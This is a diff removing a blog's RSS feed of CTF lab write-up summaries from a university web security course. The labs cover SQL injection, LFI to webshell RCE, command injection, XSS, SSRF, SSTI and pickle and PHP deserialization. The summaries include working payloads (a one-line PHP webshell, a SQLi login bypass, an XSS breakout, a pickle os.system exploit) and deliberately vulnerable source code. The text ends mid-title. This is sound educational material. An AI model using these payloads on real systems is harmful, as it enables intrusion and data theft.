@@ -1,80 +1,1574 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>NTUSTWS :: Tag :: SBK Hugo Site</title><link>https://bernie6401.github.io/tags/ntustws/index.html</link><description/><generator>Hugo</generator><language>en-us</language><atom:link href="https://bernie6401.github.io/tags/ntustws/index.xml" rel="self" type="application/rss+xml"/><item><title>Simple Web 0x01(Lab - `gitleak`)</title><link>https://bernie6401.github.io/security/course/ntust-ws/information-leak/simple-web-0x01lab---gitleak/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/information-leak/simple-web-0x01lab---gitleak/index.html</guid><description>Simple Web 0x01(Lab - gitleak) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:9000/
-Exploit - gitleak + basic Git command Use the extension of Firefox(or Google), Dotgit, to check if the website actually has git leak problem denny0223/scrabble To use scrabble tool to leak information
-$ git clone https://github.com/denny0223/scrabble.git $ cd scrabble $ sudo ./scrabble http://h4ck3r.quest:9000/ Still no flag There’s flag.php but still no flag in there. HEAD said HEAD is now at a0228bd Remove flag. Thus, we can look up the history by the command below.</description></item><item><title>Simple Web 0x02(Lab - `.DS_Store`)</title><link>https://bernie6401.github.io/security/course/ntust-ws/information-leak/simple-web-0x02lab---.ds_store/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/information-leak/simple-web-0x02lab---.ds_store/index.html</guid><description>Simple Web 0x02(Lab - .DS_Store) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:9001/
-Exploit - .DS_Store Clone lijiejie/ds_store_exp
-$ git clone https://github.com/lijiejie/ds_store_exp.git $ python ds_store_exp.py http://h4ck3r.quest:9001/.DS_Store [200] http://h4ck3r.quest:9001/.DS_Store [200] http://h4ck3r.quest:9001/super_secret_meowmeow.php [200] http://h4ck3r.quest:9001/index.php $ cd h4ck3r.quest_9001 $ cat super_secret_meowmeow.php FLAG{.DS_Store is so annoying lmao} Note that, must install python 2, requests, ds_store and modify queue(import queue→import Queue as queue) $ conda create --name py2.7 python=2.7 $ conda install -c auto ds_store $ conda install -c anaconda requests Reference python-no-module-named-queue</description></item><item><title>Simple Web 0x03(Lab - Log me in + Revenge)</title><link>https://bernie6401.github.io/security/course/ntust-ws/sql-injection/simple-web-0x03lab---log-me-in-+-revenge/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/sql-injection/simple-web-0x03lab---log-me-in-+-revenge/index.html</guid><description>Simple Web 0x03(Lab - Log me in + Revenge) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:8200/ Challenge: http://h4ck3r.quest:8201/
-Exploit - SQLi Payload → ') or ('1'='1') -- # SELECT * FROM admin WHERE (username=’’) or (‘1’=‘1’) – #’) AND (password=‘MTIz’) Flag: FLAG{b4by_sql_inj3cti0n}
-Revenge source code :::spoiler code
-from flask import Flask, render_template, redirect, request, g, Response import sqlite3 app = Flask(__name__) def get_db(): db = getattr(g, '_database', None) if db is None: db = g._database = sqlite3.connect('/tmp/database.db') db.row_factory = sqlite3.Row return db @app.before_first_request def init_db(): cursor = get_db().cursor() cursor.execute(""" CREATE TABLE IF NOT EXISTS "admin" ( "username" TEXT NOT NULL, "password" TEXT NOT NULL ) """) cursor.execute("SELECT COUNT(*) as count FROM admin WHERE username='admin'") count = cursor.fetchone()['count'] if count == 0: import secrets cursor.execute("INSERT INTO admin (username, password) VALUES (?,?)", ('admin', secrets.token_urlsafe())) get_db().commit() @app.teardown_appcontext def close_connection(exception): db = getattr(g, '_database', None) if db is not None: db.close() @app.route("/") def home(): return render_template("index.html", failed=request.args.get('failed') != None) @app.route("/login", methods=['POST']) def login(): username = request.form.get('username') password = request.form.get('password') if not username or not password: return redirect("/?failed") cur = get_db().execute(f"SELECT * FROM admin WHERE (username='{username}')") res = cur.fetchone() cur.close() if res['username'] == 'admin' and res['password'] == password: return "FLAG: FLAG{&lt;REDACTED>}" return redirect("/?failed") @app.route("/source") def source(): import re source_code = open(__file__).read() source_code = re.sub(r'FLAG{[^}\s]+}', 'FLAG{&lt;REDACTED>}', source_code, 1) return Response(source_code, mimetype='text/plain') if __name__ == '__main__': app.run(debug=True) :::</description></item><item><title>Simple Web 0x04(Lab - Image Space 0x01)</title><link>https://bernie6401.github.io/security/course/ntust-ws/upload/simple-web-0x04lab---image-space-0x01/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/upload/simple-web-0x04lab---image-space-0x01/index.html</guid><description>Simple Web 0x04(Lab - Image Space 0x01) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:9010
-Source code :::spoiler code
-&lt;?php if (isset($_GET['source'])) { highlight_file(__FILE__); exit; } ?> &lt;h1>Image Uploader&lt;/h1> &lt;p>Only supports: jpg, jpeg, png&lt;/p> &lt;!-- upload form --> &lt;form action="index.php" method="POST" enctype="multipart/form-data"> &lt;input type="file" name="image_file"> &lt;input type="submit" value="Upload"> &lt;/form> &lt;p> &lt;a href="https://bernie6401.github.io/?source">View Source&lt;/a> &lt;/p> &lt;?php if (!isset($_FILES['image_file'])) { die('Give me a file!'); } $filename = basename($_FILES['image_file']['name']); $prefix = bin2hex(random_bytes(8)); move_uploaded_file($_FILES['image_file']['tmp_name'], "images/${prefix}_${filename}"); echo "&lt;img src=\"images/${prefix}_${filename}\">"; ?> :::</description></item><item><title>Simple Web 0x05(Lab - Image Space 0x02)</title><link>https://bernie6401.github.io/security/course/ntust-ws/upload/simple-web-0x05lab---image-space-0x02/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/upload/simple-web-0x05lab---image-space-0x02/index.html</guid><description>Simple Web 0x05(Lab - Image Space 0x02) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:9011
-Source code :::spoiler
-&lt;?php if (isset($_GET['source'])) { highlight_file(__FILE__); exit; } ?> &lt;h1>Image Uploader&lt;/h1> &lt;p>Only supports: jpg, jpeg, png&lt;/p> &lt;form action="index.php" method="POST" enctype="multipart/form-data"> &lt;input type="file" name="image_file"> &lt;input type="submit" value="Upload"> &lt;/form> &lt;p> &lt;a href="https://bernie6401.github.io/?source">View Source&lt;/a> &lt;/p> &lt;?php if (!isset($_FILES['image_file'])) { die('Give me a file!'); } $filename = basename($_FILES['image_file']['name']); $extension = strtolower(explode(".", $filename)[1]); if (!in_array($extension, ['png', 'jpeg', 'jpg']) !== false) { die("Invalid file extension: $extension."); } $prefix = bin2hex(random_bytes(8)); move_uploaded_file($_FILES['image_file']['tmp_name'], "images/${prefix}_${filename}"); echo "&lt;img src=\"/images/${prefix}_${filename}\">"; ?> :::</description></item><item><title>Simple Web 0x06(Lab - Image Space 0x03)</title><link>https://bernie6401.github.io/security/course/ntust-ws/upload/simple-web-0x06lab---image-space-0x03/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/upload/simple-web-0x06lab---image-space-0x03/index.html</guid><description>Simple Web 0x06(Lab - Image Space 0x03) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:9012
-Background file signature
-Source code :::spoiler
-&lt;?php if (isset($_GET['source'])) { highlight_file(__FILE__); exit; } ?> &lt;h1>Image Uploader&lt;/h1> &lt;p>Only supports: jpg, jpeg, png&lt;/p> &lt;form action="index.php" method="POST" enctype="multipart/form-data"> &lt;input type="file" name="image_file"> &lt;input type="submit" value="Upload"> &lt;/form> &lt;p> &lt;a href="https://bernie6401.github.io/?source">View Source&lt;/a> &lt;/p> &lt;?php if (!isset($_FILES['image_file'])) { die('Give me a file!'); } $filename = basename($_FILES['image_file']['name']); $extension = strtolower(explode(".", $filename)[1]); if (!in_array($extension, ['png', 'jpeg', 'jpg']) !== false) { die("Invalid file extension: $extension."); } if (in_array($_FILES['image_file']['type'], ["image/png", "image/jpeg", "image/jpg"]) === false) { die("Invalid file type: " . $_SERVER["CONTENT_TYPE"]); } list($_, $_, $type) = getimagesize($_FILES['image_file']['tmp_name']); if ($type !== IMAGETYPE_JPEG &amp;&amp; $type !== IMAGETYPE_PNG) { die("Invalid image type."); } $prefix = bin2hex(random_bytes(8)); move_uploaded_file($_FILES['image_file']['tmp_name'], "images/${prefix}_${filename}"); echo "&lt;img src=\"/images/${prefix}_${filename}\">"; ?> ::: It has 2 extra constraint must be bypassed. Use burpsuite and change valid file signature</description></item><item><title>Simple Web 0x07(Lab - `HakkaMD`)</title><link>https://bernie6401.github.io/security/course/ntust-ws/lfi/simple-web-0x07lab---hakkamd/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/lfi/simple-web-0x07lab---hakkamd/index.html</guid><description>Simple Web 0x07(Lab - HakkaMD) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:8401
-Background 資安這條路-Local File Inclusion
-Exploit - LFI to RCE First things first, the website has LFI problem http://h4ck3r.quest:8401/?module=/etc/passwd 通靈 It provided phpinfo() so that we can check the save address of session. The setting is default, thus we can use LFI to read session file: http://h4ck3r.quest:8401/?module=/tmp/sess_0qvmvnk5lh140239e6ol9l16h1 We can see that session file store the data of what we enter. Therefore, we could enter webshell to get shell webshell &lt;?php system($_GET['sh']); ?> ↓ http://h4ck3r.quest:8401/?module=/tmp/sess_2f0dilri9ju4553th2bkclefal&amp;sh=ls%20/ ↓ ↓ http://h4ck3r.quest:8401/?module=/tmp/sess_2f0dilri9ju4553th2bkclefal&amp;sh=cat%20/flag_aff6136bbef82137 Then we got flag!!!</description></item><item><title>Simple Web 0x08(Lab - My First Meow Website)</title><link>https://bernie6401.github.io/security/course/ntust-ws/lfi/simple-web-0x08lab---my-first-meow-website/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/lfi/simple-web-0x08lab---my-first-meow-website/index.html</guid><description>Simple Web 0x08(Lab - My First Meow Website) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:8400/ Target: Login as Admin
-Background PHP 偽協議 (一) Web Security 0x1
-Exploit Observe According to the URL, http://h4ck3r.quest:8400/?page=inc/home, it might have LFI problem. Use php://filter to read page http://h4ck3r.quest:8400/?page=php://filter/convert.base64-encode/resource=inc/home :::spoiler page source code &lt;!DOCTYPE html> &lt;html lang="en"> &lt;head> &lt;meta charset="UTF-8"> &lt;meta http-equiv="X-UA-Compatible" content="IE=edge"> &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"> &lt;title>Meow&lt;/title> &lt;link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.9.2/css/bulma.min.css"> &lt;/head> &lt;body> &lt;nav class="navbar is-dark" role="navigation" aria-label="main navigation"> &lt;div class="navbar-brand"> &lt;a class="navbar-item" href="https://bernie6401.github.io/?page=inc/home">🐱&lt;/a> &lt;/div> &lt;div id="navbarBasicExample" class="navbar-menu"> &lt;div class="navbar-start"> &lt;a class="navbar-item" href="https://bernie6401.github.io/?page=inc/home"> Home &lt;/a> &lt;a class="navbar-item" href="https://bernie6401.github.io/?page=inc/about"> About &lt;/a> &lt;a class="navbar-item" href="https://bernie6401.github.io/admin.php"> Admin &lt;/a> &lt;/div> &lt;/div> &lt;/nav> &lt;div class="container" style="margin-top: 1em;"> &lt;?php if (isset($_GET['page'])) include($_GET['page'] . ".php"); else include("inc/home.php"); ?> &lt;/div> &lt;/body> &lt;/html> ::: Observe page source code We know that admin.php is under / directory. http://h4ck3r.quest:8400/?page=php://filter/convert.base64-encode/resource=admin :::spoiler admin source code &lt;h1>Admin Panel&lt;/h1> &lt;form> &lt;input type="text" name="username" value="admin"> &lt;input type="password" name="password"> &lt;input type="submit" value="Submit"> &lt;/form> &lt;?php $admin_account = array("username" => "admin", "password" => "kqqPFObwxU8HYo8E5QgNLhdOxvZmtPhyBCyDxCwpvAQ"); if ( isset($_GET['username']) &amp;&amp; isset($_GET['password']) &amp;&amp; $_GET['username'] === $admin_account['username'] &amp;&amp; $_GET['password'] === $admin_account['password'] ) { echo "&lt;h1>LOGIN SUCCESS!&lt;/h1>&lt;p>".getenv('FLAG')."&lt;/p>"; } ?> ::: Then we get admin password is: kqqPFObwxU8HYo8E5QgNLhdOxvZmtPhyBCyDxCwpvAQ. Then we got flag!!!</description></item><item><title>Simple Web 0x09(Lab - DNS Lookup Tool)</title><link>https://bernie6401.github.io/security/course/ntust-ws/command-injection/simple-web-0x09lab---dns-lookup-tool/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/command-injection/simple-web-0x09lab---dns-lookup-tool/index.html</guid><description>Simple Web 0x09(Lab - DNS Lookup Tool) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:8300/
-Source code :::spoiler code
-&lt;?php isset($_GET['source']) and die(show_source(__FILE__, true)); ?> &lt;!DOCTYPE html> &lt;html lang="en"> &lt;head> &lt;meta charset="UTF-8"> &lt;meta http-equiv="X-UA-Compatible" content="IE=edge"> &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"> &lt;title>DNS Lookup Tool | Baby&lt;/title> &lt;link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.9.3/css/bulma.min.css"> &lt;/head> &lt;body> &lt;section class="section"> &lt;div class="container"> &lt;div class="column is-6 is-offset-3 has-text-centered"> &lt;div class="box"> &lt;h1 class="title">DNS Lookup Tool 🔍&lt;/h1> &lt;form method="POST"> &lt;div class="field"> &lt;div class="control"> &lt;input class="input" type="text" name="name" placeholder="example.com" id="hostname" value="&lt;?= $_POST['name'] ?? '' ?>"> &lt;/div> &lt;/div> &lt;button class="button is-block is-info is-fullwidth"> Lookup! &lt;/button> &lt;/form> &lt;br> &lt;?php if (isset($_POST['name'])) : ?> &lt;section class="has-text-left"> &lt;p>Lookup result:&lt;/p> &lt;pre>&lt;?= shell_exec("host '" . $_POST['name'] . "';") ?>&lt;/pre> &lt;/section> &lt;?php endif; ?> &lt;hr> &lt;a id="magic">Magic&lt;/a> | &lt;a href="https://bernie6401.github.io/?source">Source Code&lt;/a> &lt;/div> &lt;article class="message is-link is-hidden is-size-4" id="hint"> &lt;div class="message-body is-family-monospace"> host '&lt;span class="has-text-danger" id="command">&lt;/span>'; &lt;/div> &lt;/article> &lt;/div> &lt;/div> &lt;/section> &lt;script> magic.onclick = () => hint.classList.toggle("is-hidden"); window.onload = hostname.oninput = () => command.textContent = hostname.value; &lt;/script> &lt;/body> &lt;/html> :::</description></item><item><title>Simple Web 0x10(Lab - DNS Lookup Tool | WAF)</title><link>https://bernie6401.github.io/security/course/ntust-ws/command-injection/simple-web-0x10lab---dns-lookup-tool-_-waf/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/command-injection/simple-web-0x10lab---dns-lookup-tool-_-waf/index.html</guid><description>Simple Web 0x10(Lab - DNS Lookup Tool | WAF) tags: NTUSTWS CTF Web Background 2022/03/30 網頁安全 Command injection
-Source code :::spoiler code
-&lt;?php isset($_GET['source']) and die(show_source(__FILE__, true)); ?> &lt;!DOCTYPE html> &lt;html lang="en"> &lt;head> &lt;meta charset="UTF-8"> &lt;meta http-equiv="X-UA-Compatible" content="IE=edge"> &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"> &lt;title>DNS Lookup Tool | WAF&lt;/title> &lt;link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.9.3/css/bulma.min.css"> &lt;/head> &lt;body> &lt;section class="section"> &lt;div class="container"> &lt;div class="column is-6 is-offset-3 has-text-centered"> &lt;div class="box"> &lt;h1 class="title">DNS Lookup Tool 🔍 | WAF Edition&lt;/h1> &lt;form method="POST"> &lt;div class="field"> &lt;div class="control"> &lt;input class="input" type="text" name="name" placeholder="example.com" id="hostname" value="&lt;?= $_POST['name'] ?? '' ?>"> &lt;/div> &lt;/div> &lt;button class="button is-block is-info is-fullwidth"> Lookup! &lt;/button> &lt;/form> &lt;br> &lt;?php if (isset($_POST['name'])) : ?> &lt;section class="has-text-left"> &lt;p>Lookup result:&lt;/p> &lt;pre> &lt;?php $blacklist = ['|', '&amp;', ';', '>', '&lt;', "\n", 'flag']; $is_input_safe = true; foreach ($blacklist as $bad_word) if (strstr($_POST['name'], $bad_word) !== false) $is_input_safe = false; if ($is_input_safe) system("host '" . $_POST['name'] . "';"); else echo "HACKER!!!"; ?> &lt;/pre> &lt;/section> &lt;?php endif; ?> &lt;hr> &lt;a href="https://bernie6401.github.io/?source">Source Code&lt;/a> &lt;/div> &lt;/div> &lt;/div> &lt;/section> &lt;/body> &lt;/html> ::: It set some protection such as blacklist.</description></item><item><title>Simple Web 0x11(Lab - XSS Me)</title><link>https://bernie6401.github.io/security/course/ntust-ws/fronted/simple-web-0x11lab---xss-me/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/fronted/simple-web-0x11lab---xss-me/index.html</guid><description>Simple Web 0x11(Lab - XSS Me) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:8800/
-Background :::spoiler 攻擊者沒有直接攻擊受害者，而是把惡意程式植入到受害者會瀏覽的網頁，當受害者瀏覽該網頁時，就會自動執行惡意程式，並把受害主機的一些資料送回給駭客(這是其中一種受害方式，也可能很直接的被盜取COOKIE之類的) :::
-Source code ... &lt;script> const message = {"icon": "error", "titleText": "User not found.", "timer": 3000, "showConfirmButton": false, "timerProgressBar": true}; window.onload = function () { if (message !== null) Swal.fire(message); } &lt;/script> ... Exploit Check XSS ... &lt;script> const message = {"icon": "error", "titleText": "youshallnotpass", "timer": 3000, "showConfirmButton": false, "timerProgressBar": true}; window.onload = function () { if (message !== null) Swal.fire(message); } &lt;/script> ... Try to inject script tag Payload: http://h4ck3r.quest:8800/?type=error&amp;message=%3C/script%3E%3Cscript%3Ealert(123)%3C/script%3E// ... &lt;script> const message = {"icon": "error", "titleText": "&lt;/script>&lt;script>alert(123)&lt;/script>//", "timer": 3000, "showConfirmButton": false, "timerProgressBar": true}; window.onload = function () { if (message !== null) Swal.fire(message); } &lt;/script> Hint If you login as guest(password = guest), then you can get the response Fetch flag and send to beeceptor Payload:</description></item><item><title>Simple Web 0x12(Lab - Web Preview Card)</title><link>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x15lab---web-preview-card/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x15lab---web-preview-card/index.html</guid><description>Simple Web 0x12(Lab - Web Preview Card) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:8500/
-Background Web Hacking | 續章【EDU-CTF 2021】 網站安全🔒 伺服器端請求偽造 SSRF 攻擊 — 「項莊舞劍，意在沛公」
-Exploit - SSRF When you see a preview function, then it may have SSRF problem.
-Test it file:///etc/passwd or http://127.0.0.1 Analyze flag.php :::spoiler source code
-&lt;?php if ($_SERVER['REMOTE_ADDR'] !== '127.0.0.1') die("Only for localhost user."); ?> &lt;form action="https://bernie6401.github.io/flag.php" method="post"> Do you want the FLAG? &lt;input type="text" name="givemeflag" value="no"> &lt;input type="submit"> &lt;/form> &lt;?php if (isset($_POST['givemeflag']) &amp;&amp; $_POST['givemeflag'] === 'yes') echo "FLAG:", getenv('FLAG'); ::: If you want flag, you need visit /flag.php as localhost and send a form data with parameter givemeflag.</description></item><item><title>Simple Web 0x12(Lab - Web Preview Card)</title><link>https://bernie6401.github.io/security/course/ntust-ws/ssrf/simple-web-0x12lab---web-preview-card/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/ssrf/simple-web-0x12lab---web-preview-card/index.html</guid><description>Simple Web 0x12(Lab - Web Preview Card) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:8500/
-Background Web Hacking | 續章【EDU-CTF 2021】 網站安全🔒 伺服器端請求偽造 SSRF 攻擊 — 「項莊舞劍，意在沛公」
-Exploit - SSRF When you see a preview function, then it may have SSRF problem.
-Test it file:///etc/passwd or http://127.0.0.1 Analyze flag.php :::spoiler source code
-&lt;?php if ($_SERVER['REMOTE_ADDR'] !== '127.0.0.1') die("Only for localhost user."); ?> &lt;form action="https://bernie6401.github.io/flag.php" method="post"> Do you want the FLAG? &lt;input type="text" name="givemeflag" value="no"> &lt;input type="submit"> &lt;/form> &lt;?php if (isset($_POST['givemeflag']) &amp;&amp; $_POST['givemeflag'] === 'yes') echo "FLAG:", getenv('FLAG'); ::: If you want flag, you need visit /flag.php as localhost and send a form data with parameter givemeflag.</description></item><item><title>Simple Web 0x13(Lab - SSRFrog)</title><link>https://bernie6401.github.io/security/course/ntust-ws/ssrf/simple-web-0x13lab---ssrfrog/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/ssrf/simple-web-0x13lab---ssrfrog/index.html</guid><description>Simple Web 0x13(Lab - SSRFrog) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:8501/
-Background javascript Set() Web Hacking | 續章【EDU-CTF 2021】 網站安全🔒 伺服器端請求偽造 SSRF 攻擊 — 「項莊舞劍，意在沛公」
-Source code :::spoiler source code
-const express = require("express"); const http = require("http"); const app = express(); app.get("/source", (req, res) => { return res.sendFile(__filename); }) app.get('/', (req, res) => { const { url } = req.query; if (!url || typeof url !== 'string') return res.sendFile(__dirname + "/index.html"); // no duplicate characters in `url` if (url.length !== new Set(url).size) return res.sendFile(__dirname + "/frog.png"); try { http.get(url, resp => { resp.setEncoding("utf-8"); resp.statusCode === 200 ? resp.on('data', data => res.send(data)) : res.send(":("); }).on('error', () => res.send("WTF?")); } catch (error) { res.send("WTF?"); } }); app.listen(3000, '0.0.0.0'); :::</description></item><item><title>Simple Web 0x14(Lab - Debug)</title><link>https://bernie6401.github.io/security/course/ntust-ws/ssrf/simple-web-0x14lab---debug/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/ssrf/simple-web-0x14lab---debug/index.html</guid><description>Simple Web 0x14(Lab - Debug) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:9020/
-Background Source code :::spoiler source code
-from flask import Flask, request, Response import urllib.request import json app = Flask(__name__) app.config['FLAG'] = "FL4G{fake_flag}" @app.route('/') def index(): return ''' &lt;form action="https://bernie6401.github.io/proxy"> &lt;input type="text" name="url" placeholder="URL"> &lt;input type="submit"> &lt;/form> &lt;p>&lt;a href="https://bernie6401.github.io/source">Source Code&lt;/a> | &lt;a href="https://bernie6401.github.io/debug">Debug&lt;/a>&lt;/p> ''' @app.route("/proxy") def proxy(): url = request.args.get("url") if url is None: return "No URL provided" if "https://" not in url: url = "https://" + url try: with urllib.request.urlopen(url) as response: return response.read() except urllib.error.HTTPError as e: return str(e) @app.route("/debug") def debug(): # only allow access for localhost if request.remote_addr != "127.0.0.1": return "Access denied", 403 return json.dumps(app.config, default=lambda _: None) @app.route("/source") def source(): import re source_code = open(__file__).read() source_code = re.sub(r'FLAG{.*}', r'FL4G{fake_flag}', source_code, count=1) return Response(source_code, mimetype='text/plain') :::</description></item><item><title>Simple Web 0x15.5(Pickle)</title><link>https://bernie6401.github.io/security/course/ntust-ws/deserialization/simple-web-0x15.5pickle/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/deserialization/simple-web-0x15.5pickle/index.html</guid><description>Simple Web 0x15.5(Pickle) tags: NTUSTWS CTF Web Background - Pickle Python magic method: __reduce__ __recude__ is used to define what needs to be done when deserializing. Web Hacking | 終章【EDU-CTF 2021】
-Source code :::spoiler exploit.py
-import pickle import os import pickletools class exploit(object): def __reduce__(self): return (os.system, ('pwd',)) serialized = pickle.dumps(exploit()) print(bytes.hex(serialized)) optim_s = pickletools.optimize(serialized) print(pickletools.dis(serialized)) print(pickletools.dis(optim_s)) :::
-:::spoiler server_app.py
-import pickle serialized = bytes.fromhex(input('Data: ')) pickle.loads(serialized) :::
-Output &amp; Analyze In Linux</description></item><item><title>Simple Web 0x15(Lab - `Jinja`)</title><link>https://bernie6401.github.io/security/course/ntust-ws/ssti/simple-web-0x15lab---jinja/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/ssti/simple-web-0x15lab---jinja/index.html</guid><description>Simple Web 0x15(Lab - Jinja) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:8700/
-Background Web Security 0x1
-Source code :::spoiler code
-from flask import Flask, render_template_string, request, send_file app = Flask(__name__) @app.get("/") def home(): return render_template_string(""" &lt;form method="POST"> &lt;input type="text" name="name" placeholder="Your name"> &lt;button>submit&lt;/button> &lt;/form> &lt;p>&lt;a href="https://bernie6401.github.io/source">Source code&lt;/a>&lt;/p> """) @app.post("/") def welcome_message(): name = request.form.get('name') return render_template_string("&lt;p>Hello, " + name + "&lt;/p>") @app.get("/source") def source(): return send_file(__file__, mimetype="text/plain") if __name__ == '__main__': app.run(threaded=True, debug=True) :::</description></item><item><title>Simple Web 0x16.5(php unserialize)</title><link>https://bernie6401.github.io/security/course/ntust-ws/deserialization/simple-web-0x16.5php-unserialize/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/deserialization/simple-web-0x16.5php-unserialize/index.html</guid><description>Simple Web 0x16.5(php unserialize) tags: NTUSTWS CTF Web Background php magic method Source code class cat { public $sound = 'ls'; function __wakeup() { system("echo".$this->sound); } } $cat = unserialize($_GET['cat']); Description &amp; Analyze $ php -a php > class cat php > public { php { public $sound = 'ls'; php { function __wakeup() php { { php { system("echo ".$this->sound); php { } php { } php > $_GET['cat']='O:3:"cat":1:{s:5:"sound";s:4:"meow";}'; php > $cat = unserialize($_GET['cat']); meow php > $_GET['cat']='O:3:"cat":1:{s:5:"sound";s:4:";id;";}'; php > $cat = unserialize($_GET['cat']); uid=1000(sbk6401) gid=1000(sbk6401) groups=1000(sbk6401),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),117(netdev),1001(docker) This is a typical command injection. The magic method __wakeup() will be called when unserialized something.</description></item><item><title>Simple Web 0x16(Lab - Pickle)</title><link>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x11lab---pickle/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x11lab---pickle/index.html</guid><description>Simple Web 0x16(Lab - Pickle) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:8600/ Note: open a brand new window that haven’t login http://h4ck3r.quest
-Background 0x15.5(Pickle)
-Source code :::spoiler code
-from flask import Flask, request, make_response, redirect, send_file import base64 import pickle app = Flask(__name__) @app.route("/sauce") def sauce(): return send_file(__file__, mimetype="text/plain") @app.route("/") def main(): session = request.cookies.get("session") if session == None: return '&lt;form action="https://bernie6401.github.io/login" method="POST">' +\ '&lt;p>Name: &lt;input name="name" type="text">&lt;/p>' +\ '&lt;p>Age: &lt;input name="age" type="number">&lt;/p>' +\ '&lt;button>Submit&lt;/button>&lt;/form>&lt;hr>&lt;a href="https://bernie6401.github.io/sauce">Source code&lt;/a>' else: user = pickle.loads(base64.b64decode(session)) return f'&lt;p>Name: {user["name"]}&lt;/p>&lt;p>Age: {user["age"]}&lt;/p>' @app.route("/login", methods=['POST']) def login(): user = base64.b64encode(pickle.dumps({ "name": request.form.get('name'), "age": int(request.form.get('age')) })) resp = make_response(redirect('/')) resp.set_cookie("session", user) return resp :::</description></item><item><title>Simple Web 0x16(Lab - Pickle)</title><link>https://bernie6401.github.io/security/course/ntust-ws/deserialization/simple-web-0x16lab---pickle/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/deserialization/simple-web-0x16lab---pickle/index.html</guid><description>Simple Web 0x16(Lab - Pickle) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:8600/ Note: open a brand new window that haven’t login http://h4ck3r.quest
-Background 0x15.5(Pickle)
-Source code :::spoiler code
-from flask import Flask, request, make_response, redirect, send_file import base64 import pickle app = Flask(__name__) @app.route("/sauce") def sauce(): return send_file(__file__, mimetype="text/plain") @app.route("/") def main(): session = request.cookies.get("session") if session == None: return '&lt;form action="https://bernie6401.github.io/login" method="POST">' +\ '&lt;p>Name: &lt;input name="name" type="text">&lt;/p>' +\ '&lt;p>Age: &lt;input name="age" type="number">&lt;/p>' +\ '&lt;button>Submit&lt;/button>&lt;/form>&lt;hr>&lt;a href="https://bernie6401.github.io/sauce">Source code&lt;/a>' else: user = pickle.loads(base64.b64decode(session)) return f'&lt;p>Name: {user["name"]}&lt;/p>&lt;p>Age: {user["age"]}&lt;/p>' @app.route("/login", methods=['POST']) def login(): user = base64.b64encode(pickle.dumps({ "name": request.form.get('name'), "age": int(request.form.get('age')) })) resp = make_response(redirect('/')) resp.set_cookie("session", user) return resp :::</description></item><item><title>Simple Web 0x17(Lab - Baby 